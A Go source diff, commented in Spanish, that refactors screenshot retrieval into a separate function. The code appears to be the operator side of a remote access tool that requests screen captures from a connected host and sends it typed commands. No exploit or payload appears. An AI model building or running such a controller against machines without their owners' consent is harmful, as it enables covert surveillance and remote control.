@@ -39,6 +39,45 @@ const (
 	BUFFER  = 1024 //tamaño del buffer de funcion envio
 )
 
+func recibir_img(conexiones net.Conn) error {
+
+	ch_img := make(chan []byte)
+	ch_err := make(chan error)
+	contex, cancel := context.WithTimeout(context.Background(), time.Second*5)
+	defer cancel()
+
+	fmt.Println(color.Violeta + "[*] esperando la imagen ..." + color.Reset)
+	go func() {
+		byte_img, img_error := ss.Obtener_img(conexiones)
+		ch_img <- byte_img
+		ch_err <- img_error
+	}()
+
+	select {
+
+	case <-contex.Done():
+		fmt.Println("[!] el host tardo mucho en responder a la solicitud de ss")
+
+	case img_error := <-ch_err:
+		return errors.New(fmt.Sprintf("[!] error al obtener la imagen:\n %s", img_error))
+
+	case img := <-ch_img:
+		if img != nil {
+			nombre := input.Input("[*] nombre del png (sin extension)>> ")
+			ss.Escribir_img(img, nombre)
+
+			if runtime.GOOS == "windows" {
+				exec.Command("powershell", "-command", "start", fmt.Sprintf("%s.png", nombre)).Run()
+			}
+
+		} else {
+			return errors.New("no se pudo obtener la imagen por falta de permisos del host")
+		}
+
+	}
+	return nil
+}
+
 // funcion que abstrae el envio de paquetes al host
 func envio(conexiones net.Conn, envio string) error {
 
@@ -105,40 +144,10 @@ func Comando(conexiones net.Conn) error {
 
 	case OP4:
 
-		ch_img := make(chan []byte)
-		ch_err := make(chan error)
-		contex, cancel := context.WithTimeout(context.Background(), time.Second*5)
-		defer cancel()
-
-		fmt.Println(color.Violeta + "[*] esperando la imagen ..." + color.Reset)
-		go func() {
-			byte_img, img_error := ss.Obtener_img(conexiones)
-			ch_img <- byte_img
-			ch_err <- img_error
-		}()
-
-		select {
-
-		case <-contex.Done():
-			fmt.Println("[!] el host tardo mucho en responder a la solicitud de ss")
-
-		case img_error := <-ch_err:
-			return errors.New(fmt.Sprintf("[!] error al obtener la imagen:\n %s", img_error))
-
-		case img := <-ch_img:
-			if img != nil {
-				nombre := input.Input("[*] nombre del png (sin extension)>> ")
-				ss.Escribir_img(img, nombre)
-
-				if runtime.GOOS == "windows" {
-					exec.Command("powershell", "-command", "start", fmt.Sprintf("%s.png", nombre)).Run()
-				}
-
-			} else {
-				return errors.New("no se pudo obtener la imagen por falta de permisos del host")
-			}
-
+		if err_img := recibir_img(conexiones); err_img != nil {
+			return err_img
 		}
+
 	case OP5:
 		fmt.Print("\n")
 		entrada := input.Input("[#] enviar comando >> ")
